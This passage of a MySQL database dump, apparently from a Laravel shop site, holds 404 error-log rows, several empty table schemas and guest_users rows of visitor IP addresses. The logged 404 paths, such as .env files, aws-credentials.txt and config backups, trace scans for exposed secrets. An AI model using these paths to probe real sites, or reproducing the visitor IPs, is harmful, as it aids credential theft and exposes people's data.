(1129,404,'https://venu.uz/helm/.env',1,NULL,NULL,'2025-07-11 01:00:57','2025-07-11 01:00:57'),
(1130,404,'https://venu.uz/terraform/.env',1,NULL,NULL,'2025-07-11 01:00:58','2025-07-11 01:00:58'),
(1131,404,'https://venu.uz/ansible/.env',1,NULL,NULL,'2025-07-11 01:00:58','2025-07-11 01:00:58'),
(1132,404,'https://venu.uz/config/mail.json',1,NULL,NULL,'2025-07-11 01:00:58','2025-07-11 01:00:58'),
(1133,404,'https://venu.uz/secrets/config.json',1,NULL,NULL,'2025-07-11 01:00:59','2025-07-11 01:00:59'),
(1134,404,'https://venu.uz/private/keys.json',1,NULL,NULL,'2025-07-11 01:01:00','2025-07-11 01:01:00'),
(1135,404,'https://venu.uz/.env_example',1,NULL,NULL,'2025-07-11 01:01:00','2025-07-11 01:01:00'),
(1136,404,'https://venu.uz/api',1,NULL,NULL,'2025-07-11 01:01:01','2025-07-11 01:01:01'),
(1137,404,'https://venu.uz/backend',1,NULL,NULL,'2025-07-11 01:01:01','2025-07-11 01:01:01'),
(1138,404,'https://venu.uz/config/settings.ini',1,NULL,NULL,'2025-07-11 01:01:03','2025-07-11 01:01:03'),
(1139,404,'https://venu.uz/laravel/.env.local',1,NULL,NULL,'2025-07-11 01:01:11','2025-07-11 01:01:11'),
(1140,404,'https://venu.uz/laravel/.env.production',1,NULL,NULL,'2025-07-11 01:01:12','2025-07-11 01:01:12'),
(1141,404,'https://venu.uz/laravel/.env.staging',1,NULL,NULL,'2025-07-11 01:01:12','2025-07-11 01:01:12'),
(1142,404,'https://venu.uz/laravel/core/.env.local',1,NULL,NULL,'2025-07-11 01:01:13','2025-07-11 01:01:13'),
(1143,404,'https://venu.uz/laravel/core/.env.production',1,NULL,NULL,'2025-07-11 01:01:13','2025-07-11 01:01:13'),
(1144,404,'https://venu.uz/laravel/core/.env.staging',1,NULL,NULL,'2025-07-11 01:01:13','2025-07-11 01:01:13'),
(1145,404,'https://venu.uz/dump.sh',1,NULL,NULL,'2025-07-11 01:01:17','2025-07-11 01:01:17'),
(1146,404,'https://venu.uz/php5.ini',1,NULL,NULL,'2025-07-11 01:01:17','2025-07-11 01:01:17'),
(1147,404,'https://venu.uz/config.php.bak',1,NULL,NULL,'2025-07-11 01:01:18','2025-07-11 01:01:18'),
(1148,404,'https://venu.uz/src/app.js',1,NULL,NULL,'2025-07-11 01:01:18','2025-07-11 01:01:18'),
(1149,404,'https://venu.uz/docker.sh',1,NULL,NULL,'2025-07-11 01:01:19','2025-07-11 01:01:19'),
(1150,404,'https://venu.uz/config.php.save',1,NULL,NULL,'2025-07-11 01:01:19','2025-07-11 01:01:19'),
(1151,404,'https://venu.uz/wp-config.php.backup',1,NULL,NULL,'2025-07-11 01:01:20','2025-07-11 01:01:20'),
(1152,404,'https://venu.uz/aws-credentials.txt',1,NULL,NULL,'2025-07-11 01:01:21','2025-07-11 01:01:21'),
(1153,404,'https://venu.uz/api/info',1,NULL,NULL,'2025-07-11 01:01:21','2025-07-11 01:01:21'),
(1154,404,'https://venu.uz/assets/new/back-end/img/location-blue.png',22,NULL,NULL,'2025-07-11 23:00:40','2025-07-11 23:47:47'),
(1155,404,'https://venu.uz/business-page//span[',1,NULL,NULL,'2025-07-12 05:25:38','2025-07-12 05:25:38'),
(1156,404,'https://venu.uz/product//span[',1,NULL,NULL,'2025-07-12 05:55:08','2025-07-12 05:55:08'),
(1157,404,'https://venu.uz/customer/auth//span[',1,NULL,NULL,'2025-07-12 06:33:08','2025-07-12 06:33:08'),
(1158,404,'https://venu.uz/getcmd',1,NULL,NULL,'2025-07-12 13:53:17','2025-07-12 13:53:17'),
(1159,404,'https://venu.uz/wordpress',1,NULL,NULL,'2025-07-13 01:21:06','2025-07-13 01:21:06');
/*!40000 ALTER TABLE `error_logs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `failed_jobs`
--

DROP TABLE IF EXISTS `failed_jobs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `failed_jobs` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `connection` text NOT NULL,
  `queue` text NOT NULL,
  `payload` longtext NOT NULL,
  `exception` longtext NOT NULL,
  `failed_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `failed_jobs`
--

LOCK TABLES `failed_jobs` WRITE;
/*!40000 ALTER TABLE `failed_jobs` DISABLE KEYS */;
/*!40000 ALTER TABLE `failed_jobs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `feature_deals`
--

DROP TABLE IF EXISTS `feature_deals`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `feature_deals` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `url` varchar(191) DEFAULT NULL,
  `photo` varchar(191) DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `feature_deals`
--

LOCK TABLES `feature_deals` WRITE;
/*!40000 ALTER TABLE `feature_deals` DISABLE KEYS */;
/*!40000 ALTER TABLE `feature_deals` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `flash_deal_products`
--

DROP TABLE IF EXISTS `flash_deal_products`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `flash_deal_products` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `flash_deal_id` bigint(20) DEFAULT NULL,
  `product_id` bigint(20) DEFAULT NULL,
  `discount` decimal(8,2) NOT NULL DEFAULT 0.00,
  `discount_type` varchar(20) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `flash_deal_products`
--

LOCK TABLES `flash_deal_products` WRITE;
/*!40000 ALTER TABLE `flash_deal_products` DISABLE KEYS */;
/*!40000 ALTER TABLE `flash_deal_products` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `flash_deals`
--

DROP TABLE IF EXISTS `flash_deals`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `flash_deals` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(150) DEFAULT NULL,
  `start_date` date DEFAULT NULL,
  `end_date` date DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 0,
  `featured` tinyint(1) NOT NULL DEFAULT 0,
  `background_color` varchar(255) DEFAULT NULL,
  `text_color` varchar(255) DEFAULT NULL,
  `banner` varchar(100) DEFAULT NULL,
  `slug` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `product_id` int(11) DEFAULT NULL,
  `deal_type` varchar(191) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `flash_deals`
--

LOCK TABLES `flash_deals` WRITE;
/*!40000 ALTER TABLE `flash_deals` DISABLE KEYS */;
/*!40000 ALTER TABLE `flash_deals` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `guest_users`
--

DROP TABLE IF EXISTS `guest_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `guest_users` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `ip_address` varchar(255) DEFAULT NULL,
  `fcm_token` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1321 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `guest_users`
--

LOCK TABLES `guest_users` WRITE;
/*!40000 ALTER TABLE `guest_users` DISABLE KEYS */;
INSERT INTO `guest_users` VALUES
(1,'::1',NULL,'2024-02-19 08:35:50',NULL),
(2,'::1',NULL,'2024-03-27 03:10:49',NULL),
(3,'::1',NULL,'2024-03-27 03:12:35',NULL),
(4,'::1',NULL,'2024-05-18 10:57:05',NULL),
(5,'::1',NULL,'2024-09-24 07:51:36','2024-09-24 07:51:36'),
(6,'::1',NULL,'2024-09-24 07:52:19','2024-09-24 07:52:19'),
(7,'::1',NULL,'2024-10-27 08:14:28','2024-10-27 08:14:28'),
(8,'::1',NULL,'2024-12-21 06:51:41','2024-12-21 06:51:41'),
(9,'127.0.0.1',NULL,'2025-02-13 08:41:46','2025-02-13 08:41:46'),
(10,'127.0.0.1',NULL,'2025-05-11 07:50:14','2025-05-11 07:50:14'),
(11,'213.206.61.100',NULL,'2025-06-23 22:38:12','2025-06-23 22:38:12'),
(12,'20.115.49.110',NULL,'2025-06-23 22:40:10','2025-06-23 22:40:10'),
(13,'213.206.61.100',NULL,'2025-06-23 22:41:26','2025-06-23 22:41:26'),
(14,'104.164.126.202',NULL,'2025-06-23 22:54:26','2025-06-23 22:54:26'),
(15,'35.188.58.57',NULL,'2025-06-23 23:04:33','2025-06-23 23:04:33'),
(16,'213.206.61.100',NULL,'2025-06-23 23:26:07','2025-06-23 23:26:07'),
(17,'154.28.229.246',NULL,'2025-06-23 23:26:45','2025-06-23 23:26:45'),
(18,'154.28.229.236',NULL,'2025-06-23 23:26:45','2025-06-23 23:26:45'),
(19,'52.20.19.158',NULL,'2025-06-23 23:28:33','2025-06-23 23:28:33'),
(20,'3.220.101.67',NULL,'2025-06-23 23:28:40','2025-06-23 23:28:40'),
(21,'109.202.99.46',NULL,'2025-06-23 23:50:49','2025-06-23 23:50:49'),
(22,'34.248.137.227',NULL,'2025-06-24 00:09:50','2025-06-24 00:09:50'),
(23,'34.248.137.227',NULL,'2025-06-24 00:09:51','2025-06-24 00:09:51'),
(24,'34.248.137.227',NULL,'2025-06-24 00:09:56','2025-06-24 00:09:56'),
(25,'205.169.39.21',NULL,'2025-06-24 00:15:18','2025-06-24 00:15:18'),
(26,'79.124.58.198',NULL,'2025-06-24 00:58:49','2025-06-24 00:58:49'),
(27,'23.27.145.162',NULL,'2025-06-24 01:06:42','2025-06-24 01:06:42'),
(28,'68.183.235.105',NULL,'2025-06-24 01:15:52','2025-06-24 01:15:52'),
(29,'20.83.151.102',NULL,'2025-06-24 02:33:13','2025-06-24 02:33:13'),
(30,'5.133.192.175',NULL,'2025-06-24 02:37:04','2025-06-24 02:37:04'),
(31,'18.205.157.171',NULL,'2025-06-24 03:17:25','2025-06-24 03:17:25'),
(32,'185.242.226.109',NULL,'2025-06-24 03:53:59','2025-06-24 03:53:59'),
(33,'185.242.226.109',NULL,'2025-06-24 04:52:47','2025-06-24 04:52:47'),
(34,'87.236.176.185',NULL,'2025-06-24 05:21:40','2025-06-24 05:21:40'),
(35,'165.22.49.156',NULL,'2025-06-24 07:45:33','2025-06-24 07:45:33'),
(36,'84.54.84.101',NULL,'2025-06-24 09:14:49','2025-06-24 09:14:49'),
(37,'149.154.161.251',NULL,'2025-06-24 09:15:00','2025-06-24 09:15:00'),
(38,'149.154.161.199',NULL,'2025-06-24 09:15:00','2025-06-24 09:15:00'),
(39,'84.54.84.101',NULL,'2025-06-24 09:24:44','2025-06-24 09:24:44'),
(40,'5.109.50.112',NULL,'2025-06-24 09:32:29','2025-06-24 09:32:29'),
(41,'104.168.71.171',NULL,'2025-06-24 09:49:58','2025-06-24 09:49:58'),
(42,'188.241.202.231',NULL,'2025-06-24 09:50:12','2025-06-24 09:50:12'),
(43,'181.188.147.10',NULL,'2025-06-24 10:13:01','2025-06-24 10:13:01'),
(44,'181.188.147.10',NULL,'2025-06-24 10:13:02','2025-06-24 10:13:02'),
(45,'181.188.147.10',NULL,'2025-06-24 10:13:05','2025-06-24 10:13:05'),
(46,'213.206.61.238',NULL,'2025-06-24 10:48:33','2025-06-24 10:48:33'),
(47,'44.211.158.253',NULL,'2025-06-24 10:56:23','2025-06-24 10:56:23'),
(48,'34.34.132.221',NULL,'2025-06-24 11:16:19','2025-06-24 11:16:19'),
(49,'3.230.166.24',NULL,'2025-06-24 11:18:00','2025-06-24 11:18:00'),
(50,'92.63.204.32',NULL,'2025-06-24 11:31:41','2025-06-24 11:31:41'),
(51,'104.234.115.229',NULL,'2025-06-24 12:12:04','2025-06-24 12:12:04'),
(52,'206.66.99.54',NULL,'2025-06-24 13:06:27','2025-06-24 13:06:27'),
(53,'185.180.140.5',NULL,'2025-06-24 13:06:50','2025-06-24 13:06:50'),
(54,'104.194.200.226',NULL,'2025-06-24 13:07:56','2025-06-24 13:07:56'),
(55,'154.210.111.120',NULL,'2025-06-24 13:08:09','2025-06-24 13:08:09'),
(56,'93.174.93.114',NULL,'2025-06-24 13:08:13','2025-06-24 13:08:13'),
(57,'193.233.249.167',NULL,'2025-06-24 13:17:41','2025-06-24 13:17:41'),
(58,'164.92.89.44',NULL,'2025-06-24 13:19:28','2025-06-24 13:19:28'),
(59,'91.193.232.98',NULL,'2025-06-24 13:20:24','2025-06-24 13:20:24'),
(60,'54.91.228.215',NULL,'2025-06-24 13:34:53','2025-06-24 13:34:53'),
(61,'162.216.149.15',NULL,'2025-06-24 13:43:42','2025-06-24 13:43:42'),
(62,'52.247.239.25',NULL,'2025-06-24 13:52:10','2025-06-24 13:52:10'),
(63,'52.247.239.25',NULL,'2025-06-24 13:52:53','2025-06-24 13:52:53'),
(64,'91.84.87.137',NULL,'2025-06-24 14:39:39','2025-06-24 14:39:39'),
(65,'91.84.87.137',NULL,'2025-06-24 15:33:52','2025-06-24 15:33:52'),
(66,'223.130.11.165',NULL,'2025-06-24 15:57:00','2025-06-24 15:57:00'),
(67,'223.130.11.165',NULL,'2025-06-24 15:57:01','2025-06-24 15:57:01'),
(68,'149.57.180.79',NULL,'2025-06-24 16:03:35','2025-06-24 16:03:35'),
(69,'185.242.226.109',NULL,'2025-06-24 16:07:16','2025-06-24 16:07:16'),
(70,'35.86.152.210',NULL,'2025-06-24 16:25:11','2025-06-24 16:25:11'),
(71,'45.156.128.130',NULL,'2025-06-24 16:25:43','2025-06-24 16:25:43'),
(72,'173.211.16.100',NULL,'2025-06-24 16:33:56','2025-06-24 16:33:56'),
(73,'185.139.138.115',NULL,'2025-06-24 16:37:52','2025-06-24 16:37:52'),
(74,'184.105.247.194',NULL,'2025-06-24 17:41:22','2025-06-24 17:41:22'),
(75,'5.161.204.20',NULL,'2025-06-24 17:43:53','2025-06-24 17:43:53'),
(76,'184.105.247.194',NULL,'2025-06-24 17:51:41','2025-06-24 17:51:41'),
(77,'198.44.138.81',NULL,'2025-06-24 19:16:30','2025-06-24 19:16:30'),
(78,'3.138.185.30',NULL,'2025-06-24 19:19:04','2025-06-24 19:19:04'),
(79,'54.146.207.159',NULL,'2025-06-24 19:19:11','2025-06-24 19:19:11'),
(80,'44.201.97.31',NULL,'2025-06-24 19:45:05','2025-06-24 19:45:05'),
(81,'44.201.97.31',NULL,'2025-06-24 19:45:27','2025-06-24 19:45:27'),
(82,'47.237.115.100',NULL,'2025-06-24 20:25:22','2025-06-24 20:25:22'),
(83,'91.84.87.137',NULL,'2025-06-24 21:27:23','2025-06-24 21:27:23'),
(84,'52.20.19.158',NULL,'2025-06-24 21:28:55','2025-06-24 21:28:55'),
(85,'143.137.164.74',NULL,'2025-06-24 21:29:08','2025-06-24 21:29:08'),
(86,'3.220.101.67',NULL,'2025-06-24 21:29:37','2025-06-24 21:29:37'),
(87,'3.220.101.67',NULL,'2025-06-24 21:41:18','2025-06-24 21:41:18'),
(88,'20.169.104.237',NULL,'2025-06-24 21:49:35','2025-06-24 21:49:35'),
(89,'198.235.24.27',NULL,'2025-06-24 21:49:45','2025-06-24 21:49:45'),
(90,'34.132.117.147',NULL,'2025-06-24 21:52:57','2025-06-24 21:52:57'),
(91,'104.28.154.59',NULL,'2025-06-24 21:57:25','2025-06-24 21:57:25'),
(92,'185.177.72.111',NULL,'2025-06-24 22:28:57','2025-06-24 22:28:57'),
(93,'185.177.72.111',NULL,'2025-06-24 22:29:11','2025-06-24 22:29:11'),
(94,'185.177.72.111',NULL,'2025-06-24 22:29:46','2025-06-24 22:29:46'),
(95,'185.177.72.111',NULL,'2025-06-24 22:30:22','2025-06-24 22:30:22'),
(96,'185.177.72.111',NULL,'2025-06-24 22:30:22','2025-06-24 22:30:22'),
(97,'185.177.72.111',NULL,'2025-06-24 22:34:31','2025-06-24 22:34:31'),
(98,'185.177.72.111',NULL,'2025-06-24 22:34:32','2025-06-24 22:34:32'),
(99,'66.240.236.109',NULL,'2025-06-24 22:36:24','2025-06-24 22:36:24'),
(100,'18.97.5.15',NULL,'2025-06-24 22:43:29','2025-06-24 22:43:29'),
(101,'91.196.152.213',NULL,'2025-06-24 23:05:02','2025-06-24 23:05:02'),
(102,'51.81.46.212',NULL,'2025-06-24 23:17:24','2025-06-24 23:17:24'),
(103,'54.164.157.105',NULL,'2025-06-24 23:46:04','2025-06-24 23:46:04'),
(104,'54.164.157.105',NULL,'2025-06-24 23:46:20','2025-06-24 23:46:20'),
(105,'45.156.128.126',NULL,'2025-06-25 00:44:35','2025-06-25 00:44:35'),
(106,'149.57.180.55',NULL,'2025-06-25 01:16:19','2025-06-25 01:16:19'),
(107,'104.232.195.0',NULL,'2025-06-25 01:55:39','2025-06-25 01:55:39'),
(108,'85.142.100.138',NULL,'2025-06-25 02:00:35','2025-06-25 02:00:35'),
(109,'79.124.58.198',NULL,'2025-06-25 02:08:42','2025-06-25 02:08:42'),
(110,'112.120.228.189',NULL,'2025-06-25 02:42:20','2025-06-25 02:42:20'),
(111,'112.120.228.189',NULL,'2025-06-25 02:42:25','2025-06-25 02:42:25'),
(112,'54.197.15.53',NULL,'2025-06-25 03:15:52','2025-06-25 03:15:52'),
(113,'185.242.226.109',NULL,'2025-06-25 04:36:01','2025-06-25 04:36:01'),
(114,'185.242.226.109',NULL,'2025-06-25 05:29:43','2025-06-25 05:29:43'),
(115,'154.212.141.200',NULL,'2025-06-25 05:41:47','2025-06-25 05:41:47'),
(116,'118.26.39.104',NULL,'2025-06-25 05:42:37','2025-06-25 05:42:37'),
(117,'154.212.141.235',NULL,'2025-06-25 05:49:04','2025-06-25 05:49:04'),
(118,'159.89.4.250',NULL,'2025-06-25 06:08:49','2025-06-25 06:08:49'),
(119,'64.62.156.24',NULL,'2025-06-25 06:32:18','2025-06-25 06:32:18'),
(120,'64.62.156.28',NULL,'2025-06-25 06:44:29','2025-06-25 06:44:29'),
(121,'45.79.172.21',NULL,'2025-06-25 07:41:52','2025-06-25 07:41:52'),
(122,'15.204.182.106',NULL,'2025-06-25 09:14:33','2025-06-25 09:14:33'),
(123,'139.162.143.34',NULL,'2025-06-25 09:52:27','2025-06-25 09:52:27'),
(124,'185.196.9.254',NULL,'2025-06-25 09:56:04','2025-06-25 09:56:04'),
(125,'118.194.234.29',NULL,'2025-06-25 10:17:28','2025-06-25 10:17:28'),
(126,'8.41.221.61',NULL,'2025-06-25 10:45:40','2025-06-25 10:45:40'),
(127,'8.41.221.61',NULL,'2025-06-25 10:45:43','2025-06-25 10:45:43'),
(128,'91.231.89.120',NULL,'2025-06-25 11:25:43','2025-06-25 11:25:43'),
(129,'91.196.152.87',NULL,'2025-06-25 11:28:31','2025-06-25 11:28:31'),
(130,'185.139.138.115',NULL,'2025-06-25 12:31:07','2025-06-25 12:31:07'),
(131,'94.247.172.129',NULL,'2025-06-25 12:52:55','2025-06-25 12:52:55'),
(132,'162.216.149.247',NULL,'2025-06-25 13:23:08','2025-06-25 13:23:08'),
(133,'81.17.21.242',NULL,'2025-06-25 13:32:26','2025-06-25 13:32:26'),
(134,'138.197.15.3',NULL,'2025-06-25 13:50:05','2025-06-25 13:50:05'),
(135,'90.156.160.238',NULL,'2025-06-25 13:50:09','2025-06-25 13:50:09'),
(136,'34.79.200.193',NULL,'2025-06-25 14:49:46','2025-06-25 14:49:46'),
(137,'184.73.109.159',NULL,'2025-06-25 15:01:12','2025-06-25 15:01:12'),
(138,'185.247.137.145',NULL,'2025-06-25 15:44:36','2025-06-25 15:44:36'),
(139,'209.141.59.132',NULL,'2025-06-25 15:50:58','2025-06-25 15:50:58'),
(140,'185.242.226.109',NULL,'2025-06-25 16:47:24','2025-06-25 16:47:24'),
(141,'104.164.104.37',NULL,'2025-06-25 16:53:13','2025-06-25 16:53:13'),
(142,'149.57.180.176',NULL,'2025-06-25 17:02:12','2025-06-25 17:02:12'),
(143,'185.177.72.10',NULL,'2025-06-25 18:51:07','2025-06-25 18:51:07'),
(144,'185.177.72.10',NULL,'2025-06-25 18:54:34','2025-06-25 18:54:34'),
(145,'3.132.23.201',NULL,'2025-06-25 19:05:50','2025-06-25 19:05:50'),
(146,'176.32.195.85',NULL,'2025-06-25 20:55:30','2025-06-25 20:55:30'),
(147,'5.101.64.6',NULL,'2025-06-25 20:55:33','2025-06-25 20:55:33'),
(148,'104.28.239.4',NULL,'2025-06-25 21:59:42','2025-06-25 21:59:42'),
(149,'91.84.87.137',NULL,'2025-06-26 00:12:13','2025-06-26 00:12:13'),
(150,'20.65.195.25',NULL,'2025-06-26 00:35:13','2025-06-26 00:35:13'),
(151,'20.235.232.113',NULL,'2025-06-26 00:53:52','2025-06-26 00:53:52'),
(152,'149.57.180.115',NULL,'2025-06-26 01:23:55','2025-06-26 01:23:55'),
(153,'79.124.58.198',NULL,'2025-06-26 02:27:21','2025-06-26 02:27:21'),
(154,'165.227.134.111',NULL,'2025-06-26 05:08:17','2025-06-26 05:08:17'),
(155,'35.203.211.7',NULL,'2025-06-26 05:28:25','2025-06-26 05:28:25'),
(156,'100.27.224.170',NULL,'2025-06-26 05:37:02','2025-06-26 05:37:02'),
(157,'18.221.221.106',NULL,'2025-06-26 06:30:52','2025-06-26 06:30:52'),
(158,'45.156.128.126',NULL,'2025-06-26 07:06:57','2025-06-26 07:06:57'),
(159,'185.177.72.201',NULL,'2025-06-26 08:26:09','2025-06-26 08:26:09'),
(160,'185.177.72.201',NULL,'2025-06-26 08:27:06','2025-06-26 08:27:06'),
(161,'185.247.137.189',NULL,'2025-06-26 09:15:16','2025-06-26 09:15:16'),
(162,'106.54.32.10',NULL,'2025-06-26 09:39:32','2025-06-26 09:39:32'),
(163,'90.156.164.235',NULL,'2025-06-26 09:54:50','2025-06-26 09:54:50'),
(164,'167.94.145.105',NULL,'2025-06-26 10:09:33','2025-06-26 10:09:33'),
(165,'167.94.145.105',NULL,'2025-06-26 10:09:50','2025-06-26 10:09:50'),
(166,'199.45.155.64',NULL,'2025-06-26 10:34:47','2025-06-26 10:34:47'),
(167,'199.45.155.64',NULL,'2025-06-26 10:35:07','2025-06-26 10:35:07'),
(168,'180.163.220.51',NULL,'2025-06-26 10:38:24','2025-06-26 10:38:24'),
(169,'58.212.237.175',NULL,'2025-06-26 10:39:50','2025-06-26 10:39:50'),
(170,'180.163.220.96',NULL,'2025-06-26 10:40:16','2025-06-26 10:40:16'),
(171,'37.65.126.29',NULL,'2025-06-26 10:44:54','2025-06-26 10:44:54'),
(172,'37.65.126.29',NULL,'2025-06-26 10:44:55','2025-06-26 10:44:55'),
(173,'37.65.126.29',NULL,'2025-06-26 10:44:56','2025-06-26 10:44:56'),
(174,'57.129.4.123',NULL,'2025-06-26 11:16:45','2025-06-26 11:16:45'),
(175,'54.37.10.247',NULL,'2025-06-26 11:16:50','2025-06-26 11:16:50'),
(176,'51.38.135.19',NULL,'2025-06-26 11:16:53','2025-06-26 11:16:53'),
(177,'51.75.162.18',NULL,'2025-06-26 11:16:54','2025-06-26 11:16:54'),
(178,'51.75.162.18',NULL,'2025-06-26 11:16:57','2025-06-26 11:16:57'),
(179,'57.129.4.123',NULL,'2025-06-26 11:16:57','2025-06-26 11:16:57'),
(180,'54.37.10.247',NULL,'2025-06-26 11:16:59','2025-06-26 11:16:59'),
(181,'54.37.10.247',NULL,'2025-06-26 11:17:01','2025-06-26 11:17:01'),
(182,'51.75.162.18',NULL,'2025-06-26 11:17:05','2025-06-26 11:17:05'),
(183,'54.37.10.247',NULL,'2025-06-26 11:17:05','2025-06-26 11:17:05'),
(184,'51.75.162.18',NULL,'2025-06-26 11:17:05','2025-06-26 11:17:05'),
(185,'45.156.128.43',NULL,'2025-06-26 11:35:56','2025-06-26 11:35:56'),
(186,'198.55.98.91',NULL,'2025-06-26 12:12:14','2025-06-26 12:12:14'),
(187,'198.55.98.91',NULL,'2025-06-26 12:13:25','2025-06-26 12:13:25'),
(188,'167.94.145.110',NULL,'2025-06-26 12:41:12','2025-06-26 12:41:12'),
(189,'167.94.145.110',NULL,'2025-06-26 12:41:25','2025-06-26 12:41:25'),
(190,'66.240.236.109',NULL,'2025-06-26 12:59:28','2025-06-26 12:59:28'),
(191,'90.156.164.235',NULL,'2025-06-26 13:36:57','2025-06-26 13:36:57'),
(192,'54.245.162.174',NULL,'2025-06-26 14:12:44','2025-06-26 14:12:44'),
(193,'54.245.162.174',NULL,'2025-06-26 14:12:46','2025-06-26 14:12:46'),
(194,'94.26.90.219',NULL,'2025-06-26 14:16:36','2025-06-26 14:16:36'),
(195,'23.27.145.220',NULL,'2025-06-26 15:22:46','2025-06-26 15:22:46'),
(196,'90.156.164.235',NULL,'2025-06-26 15:31:29','2025-06-26 15:31:29'),
(197,'86.111.225.141',NULL,'2025-06-26 18:14:59','2025-06-26 18:14:59'),
(198,'54.224.111.32',NULL,'2025-06-26 18:15:48','2025-06-26 18:15:48'),
(199,'52.91.121.177',NULL,'2025-06-26 18:15:49','2025-06-26 18:15:49'),
(200,'44.200.3.163',NULL,'2025-06-26 18:18:48','2025-06-26 18:18:48'),
(201,'100.27.48.191',NULL,'2025-06-26 18:18:49','2025-06-26 18:18:49'),
(202,'156.146.36.72',NULL,'2025-06-26 19:30:30','2025-06-26 19:30:30'),
(203,'156.146.36.72',NULL,'2025-06-26 19:32:49','2025-06-26 19:32:49'),
(204,'156.146.36.72',NULL,'2025-06-26 19:32:56','2025-06-26 19:32:56'),
(205,'54.164.157.105',NULL,'2025-06-26 20:27:41','2025-06-26 20:27:41'),
(206,'192.104.34.34',NULL,'2025-06-27 00:38:36','2025-06-27 00:38:36'),
(207,'37.61.227.57',NULL,'2025-06-27 02:50:20','2025-06-27 02:50:20'),
(208,'161.123.162.245',NULL,'2025-06-27 02:51:03','2025-06-27 02:51:03'),
(209,'196.51.196.28',NULL,'2025-06-27 05:23:01','2025-06-27 05:23:01'),
(210,'138.197.70.55',NULL,'2025-06-27 05:34:17','2025-06-27 05:34:17'),
(211,'44.192.131.24',NULL,'2025-06-27 10:57:06','2025-06-27 10:57:06'),
(212,'44.192.131.24',NULL,'2025-06-27 10:57:16','2025-06-27 10:57:16'),
(213,'185.177.72.22',NULL,'2025-06-27 12:48:33','2025-06-27 12:48:33'),
(214,'185.177.72.22',NULL,'2025-06-27 12:49:00','2025-06-27 12:49:00'),
(215,'185.177.72.22',NULL,'2025-06-27 12:49:05','2025-06-27 12:49:05'),
(216,'185.139.138.115',NULL,'2025-06-27 13:33:05','2025-06-27 13:33:05'),
(217,'54.160.225.124',NULL,'2025-06-27 13:36:32','2025-06-27 13:36:32'),
(218,'23.27.145.23',NULL,'2025-06-28 00:36:49','2025-06-28 00:36:49'),
(219,'168.151.138.79',NULL,'2025-06-28 02:52:48','2025-06-28 02:52:48'),
(220,'104.232.199.48',NULL,'2025-06-28 02:53:04','2025-06-28 02:53:04'),
(221,'54.175.123.67',NULL,'2025-06-28 07:05:13','2025-06-28 07:05:13'),
(222,'54.82.69.48',NULL,'2025-06-28 07:05:16','2025-06-28 07:05:16'),
(223,'90.156.164.235',NULL,'2025-06-28 09:22:51','2025-06-28 09:22:51'),
(224,'90.156.164.235',NULL,'2025-06-28 10:08:30','2025-06-28 10:08:30'),
(225,'94.247.172.129',NULL,'2025-06-28 11:08:37','2025-06-28 11:08:37'),
(226,'94.247.172.129',NULL,'2025-06-28 11:52:01','2025-06-28 11:52:01'),
(227,'31.97.153.61',NULL,'2025-06-28 13:24:39','2025-06-28 13:24:39'),
(228,'34.90.238.78',NULL,'2025-06-28 15:10:00','2025-06-28 15:10:00'),
(229,'90.156.164.235',NULL,'2025-06-28 15:42:03','2025-06-28 15:42:03'),
(230,'149.57.180.30',NULL,'2025-06-28 16:16:18','2025-06-28 16:16:18'),
(231,'84.54.84.224',NULL,'2025-06-28 17:45:31','2025-06-28 17:45:31'),
(232,'5.101.64.6',NULL,'2025-06-28 18:12:57','2025-06-28 18:12:57'),
(233,'84.54.84.224',NULL,'2025-06-28 20:25:29','2025-06-28 20:25:29'),
(234,'34.123.191.147',NULL,'2025-06-28 22:42:48','2025-06-28 22:42:48'),
(235,'34.123.191.147',NULL,'2025-06-28 22:42:51','2025-06-28 22:42:51'),
